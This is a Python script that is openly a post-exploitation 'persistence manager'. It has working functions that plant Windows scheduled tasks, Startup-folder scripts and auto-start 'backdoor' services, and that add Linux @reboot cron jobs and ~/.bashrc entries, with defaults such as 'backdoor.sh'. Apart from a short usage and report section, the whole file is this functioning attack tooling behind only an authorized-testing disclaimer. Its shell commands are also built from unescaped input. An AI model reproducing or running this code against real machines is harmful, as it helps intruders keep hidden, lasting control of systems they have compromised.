#!/usr/bin/env python3
"""
Persistence Manager
Manages persistence mechanisms for post-exploitation.
WARNING: For authorized security testing only!
"""

import os
import sys
import platform
from typing import List, Dict
from pathlib import Path

class PersistenceManager:
    def __init__(self):
        self.os_type = platform.system()
        self.persistence_methods = []
    
    def add_windows_scheduled_task(self, task_name: str, command: str, 
                                   trigger: str = 'logon') -> bool:
        """Add Windows scheduled task for persistence"""
        if self.os_type != 'Windows':
            print("[-] This method only works on Windows")
            return False
        
        try:
            # Create scheduled task XML
            xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{command}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            # Save XML temporarily
            xml_file = f'{task_name}.xml'
            with open(xml_file, 'w') as f:
                f.write(xml_content)
            
            # Import task
            os.system(f'schtasks /create /tn "{task_name}" /xml "{xml_file}" /f')
            os.remove(xml_file)
            
            print(f"[+] Scheduled task '{task_name}' created")
            self.persistence_methods.append({
                'type': 'scheduled_task',
                'name': task_name,
                'command': command
            })
            return True
        except Exception as e:
            print(f"[-] Error creating scheduled task: {e}")
            return False
    
    def add_linux_cron_job(self, command: str, schedule: str = '@reboot') -> bool:
        """Add Linux cron job for persistence"""
        if self.os_type == 'Windows':
            print("[-] This method only works on Linux/Unix")
            return False
        
        try:
            cron_entry = f"{schedule} {command}\n"
            
            # Append to crontab
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
            
            print(f"[+] Cron job added: {schedule} {command}")
            self.persistence_methods.append({
                'type': 'cron_job',
                'schedule': schedule,
                'command': command
            })
            return True
        except Exception as e:
            print(f"[-] Error adding cron job: {e}")
            return False
    
    def add_startup_script_windows(self, script_path: str) -> bool:
        """Add startup script on Windows"""
        if self.os_type != 'Windows':
            print("[-] This method only works on Windows")
            return False
        
        try:
            startup_path = os.path.join(
                os.environ.get('APPDATA'),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            os.makedirs(startup_path, exist_ok=True)
            
            # Copy script to startup folder
            import shutil
            script_name = os.path.basename(script_path)
            dest_path = os.path.join(startup_path, script_name)
            shutil.copy2(script_path, dest_path)
            
            print(f"[+] Startup script added: {dest_path}")
            self.persistence_methods.append({
                'type': 'startup_script',
                'path': dest_path
            })
            return True
        except Exception as e:
            print(f"[-] Error adding startup script: {e}")
            return False
    
    def add_startup_script_linux(self, script_path: str) -> bool:
        """Add startup script on Linux"""
        if self.os_type == 'Windows':
            print("[-] This method only works on Linux/Unix")
            return False
        
        try:
            # Add to .bashrc or .profile
            home = os.path.expanduser('~')
            bashrc = os.path.join(home, '.bashrc')
            
            with open(bashrc, 'a') as f:
                f.write(f'\n# Persistence\n{script_path}\n')
            
            print(f"[+] Added to {bashrc}")
            self.persistence_methods.append({
                'type': 'startup_script',
                'path': bashrc
            })
            return True
        except Exception as e:
            print(f"[-] Error adding startup script: {e}")
            return False
    
    def create_backdoor_service_windows(self, service_name: str, 
                                       executable_path: str) -> bool:
        """Create Windows service for persistence"""
        if self.os_type != 'Windows':
            print("[-] This method only works on Windows")
            return False
        
        try:
            # Create service using sc command
            os.system(f'sc create {service_name} binPath= "{executable_path}" start= auto')
            os.system(f'sc start {service_name}')
            
            print(f"[+] Service '{service_name}' created and started")
            self.persistence_methods.append({
                'type': 'service',
                'name': service_name,
                'path': executable_path
            })
            return True
        except Exception as e:
            print(f"[-] Error creating service: {e}")
            return False
    
    def list_persistence(self) -> List[Dict]:
        """List all persistence mechanisms"""
        return self.persistence_methods
    
    def generate_report(self) -> str:
        """Generate persistence report"""
        report = "# Persistence Mechanisms Report\n\n"
        report += f"**OS Type**: {self.os_type}\n\n"
        report += f"## Persistence Methods ({len(self.persistence_methods)})\n\n"
        
        for i, method in enumerate(self.persistence_methods, 1):
            report += f"### {i}. {method['type']}\n\n"
            for key, value in method.items():
                if key != 'type':
                    report += f"- **{key}**: {value}\n"
            report += "\n"
        
        return report

def main():
    manager = PersistenceManager()
    
    print(f"[*] OS Type: {manager.os_type}")
    print("[*] Persistence Manager\n")
    
    if len(sys.argv) > 1:
        action = sys.argv[1]
        
        if action == 'scheduled_task' and manager.os_type == 'Windows':
            task_name = sys.argv[2] if len(sys.argv) > 2 else 'TestTask'
            command = sys.argv[3] if len(sys.argv) > 3 else 'calc.exe'
            manager.add_windows_scheduled_task(task_name, command)
        
        elif action == 'cron' and manager.os_type != 'Windows':
            command = sys.argv[2] if len(sys.argv) > 2 else '/bin/bash'
            schedule = sys.argv[3] if len(sys.argv) > 3 else '@reboot'
            manager.add_linux_cron_job(command, schedule)
        
        elif action == 'startup':
            script_path = sys.argv[2] if len(sys.argv) > 2 else 'backdoor.sh'
            if manager.os_type == 'Windows':
                manager.add_startup_script_windows(script_path)
            else:
                manager.add_startup_script_linux(script_path)
        
        elif action == 'service' and manager.os_type == 'Windows':
            service_name = sys.argv[2] if len(sys.argv) > 2 else 'TestService'
            executable = sys.argv[3] if len(sys.argv) > 3 else 'C:\\Windows\\System32\\calc.exe'
            manager.create_backdoor_service_windows(service_name, executable)
        
        elif action == 'list':
            methods = manager.list_persistence()
            for method in methods:
                print(f"[+] {method['type']}: {method}")
    else:
        print("Usage:")
        print("  python persistence_manager.py scheduled_task <name> <command>")
        print("  python persistence_manager.py cron <command> [schedule]")
        print("  python persistence_manager.py startup <script_path>")
        print("  python persistence_manager.py service <name> <executable>")
        print("  python persistence_manager.py list")
    
    # Generate report
    report = manager.generate_report()
    with open('persistence_report.md', 'w') as f:
        f.write(report)
    
    print(f"\n[+] Report saved to persistence_report.md")
    print(f"[!] WARNING: Only use on systems you own or have permission to test!")

if __name__ == '__main__':
    main()

